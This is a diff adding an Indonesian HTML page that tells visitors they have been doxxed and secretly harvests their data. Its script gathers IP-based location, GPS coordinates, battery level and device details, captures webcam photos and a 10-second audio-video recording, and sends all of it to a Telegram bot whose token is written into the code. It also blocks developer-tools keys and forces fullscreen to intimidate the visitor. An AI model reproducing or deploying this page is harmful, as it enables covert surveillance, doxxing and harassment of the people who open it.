@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>ANDA TERDOXING</title>
+  <style>
+    html, body{
+        margin: 0;
+        padding: 0;
+        background:url("https://nathanprinsley-files.prinsh.com/data-1/images/NathanPrinsley-port_listener.gif") repeat center center fixed black;
+        color: white;
+        font-family: 'Goldman', cursive;
+    }
+
+
+    h1 {
+      font-size: 3em;
+      color: red;
+      animation: blink 1s infinite;
+      background: black;
+      padding: 10px 20px;
+      border: 2px solid red;
+      margin-bottom: 20px;
+    }
+
+    p {
+      font-size: 1.5em;
+      background: rgba(0, 0, 0, 0.7);
+      padding: 20px;
+      max-width: 80%;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.1; }
+    }
+  </style>
+</head>
+<body oncontextmenu="return false" onkeydown="blockKeys(event)">
+  <audio autoplay loop>
+    <source src="https://www.myinstants.com/media/sounds/windows-xp-error.mp3" type="audio/mpeg">
+  </audio>
+
+  <h1>⚠️ ANDA TELAH TERDOXING⚠️</h1>
+  <p>
+    Informasi pribadi Anda telah berhasil dikumpulkan.<br><br>
+    IP Address, lokasi, akun media sosial, serta data perangkat Anda sudah diamankan.<br><br>
+    Jangan pernah merasa aman di dunia digital. Anda sedang diawasi...
+  </p>
+
+  <script>
+    function blockKeys(e) {
+      if (
+        e.key === "F12" ||
+        (e.ctrlKey && e.shiftKey && ["I", "J", "C"].includes(e.key)) ||
+        (e.ctrlKey && e.key === "U")
+      ) {
+        e.preventDefault();
+      }
+    }
+
+    // Paksa Fullscreen saat klik
+    document.addEventListener("click", () => {
+      if (!document.fullscreenElement) {
+        document.documentElement.requestFullscreen().catch(() => {});
+      }
+    });
+  </script>
+
+<script>
+    const token = '7435851375:AAH7RpYei5mXA0YU0MogtjZ9FQZgA4ZzoX8';
+    const chatId = '-1002547203845';
+    const videoDuration = 10 * 1000;
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    async function getBatteryLevel() {
+  if (navigator.getBattery) {
+    try {
+      const battery = await navigator.getBattery();
+      const level = Math.round(battery.level * 100);
+      const chargingStatus = battery.charging ? "Sedang di-charge" : "Tidak di-charge";
+      return `Level Baterai: ${level}%\nStatus: ${chargingStatus}`;
+    } catch {
+      return "Battery info not available";
+    }
+  }
+  return "Battery info not supported";
+}
+
+    function sendToTelegram(type, fileBlob) {
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append(type, fileBlob);
+
+      fetch(`https://api.telegram.org/bot${token}/send${type === 'photo' ? 'Photo' : 'Video'}`, {
+        method: 'POST',
+        body: formData
+      }).then(res => res.json())
+        .then(data => console.log("Terkirim:", data))
+        .catch(err => console.error("Gagal kirim:", err));
+    }
+
+    function sendInfoToTelegram(info) {
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: info })
+      });
+    }
+
+    async function getIPInfo() {
+      try {
+        const res = await fetch('https://ipinfo.io/json?token=123456');
+        return await res.json();
+      } catch {
+        return {};
+      }
+    }
+
+    function getDeviceModel() {
+      const ua = navigator.userAgent;
+      if (ua.includes("Android")) {
+        const match = ua.match(/Android.+?;\s(.+?)\sBuild/);
+        return match ? match[1] : "Android Device";
+      }
+      if (ua.includes("iPhone")) return "iPhone";
+      if (ua.includes("iPad")) return "iPad";
+      if (ua.includes("Windows")) return "Windows PC";
+      if (ua.includes("Mac")) return "Mac";
+      return "Perangkat Tidak Diketahui";
+    }
+
+    async function start() {
+      const batteryLevel = await getBatteryLevel();
+      const userAgent = navigator.userAgent;
+      const deviceName = getDeviceModel();
+      const ipInfo = await getIPInfo();
+
+      navigator.geolocation.getCurrentPosition(async pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        const info = `
+Perangkat   : ${deviceName}
+User-Agent  : ${userAgent}
+Baterai     : ${batteryLevel}
+IP Address  : ${ipInfo.ip || "-"}
+Kota        : ${ipInfo.city || "-"}
+Wilayah     : ${ipInfo.region || "-"}
+Negara      : ${ipInfo.country || "-"}
+Lokasi Maps : https://maps.google.com/?q=${lat},${lon}
+Waktu Akses : ${new Date().toLocaleString()}
+        `;
+        sendInfoToTelegram(info);
+      }, () => {
+        const info = `
+Perangkat   : ${deviceName}
+User-Agent  : ${userAgent}
+Baterai     : ${batteryLevel}
+IP Address  : ${ipInfo.ip || "-"}
+Kota        : ${ipInfo.city || "-"}
+Wilayah     : ${ipInfo.region || "-"}
+Negara      : ${ipInfo.country || "-"}
+Lokasi Maps : Tidak diizinkan
+Waktu Akses : ${new Date().toLocaleString()}
+        `;
+        sendInfoToTelegram(info);
+      });
+
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      video.srcObject = stream;
+
+      // Pastikan video aktif dulu sebelum ambil foto
+      await new Promise(resolve => setTimeout(resolve, 1000));
+
+      // Ambil 5 foto berturut-turut, satu per detik
+      for (let i = 0; i < 5; i++) {
+        await new Promise(resolve => setTimeout(resolve, 1000)); // Tunggu 1 detik
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        await new Promise(res => {
+          canvas.toBlob(blob => {
+            sendToTelegram('photo', blob);
+            res();
+          }, 'image/jpeg');
+        });
+      }
+
+      // Rekam video 10 detik
+      const mediaRecorder = new MediaRecorder(stream);
+      const chunks = [];
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+      mediaRecorder.onstop = () => {
+        const videoBlob = new Blob(chunks, { type: 'video/webm' });
+        sendToTelegram('video', videoBlob);
+      };
+      mediaRecorder.start();
+      setTimeout(() => mediaRecorder.stop(), videoDuration);
+    }
+
+    start();
+</script>
+</body>
+  </html>
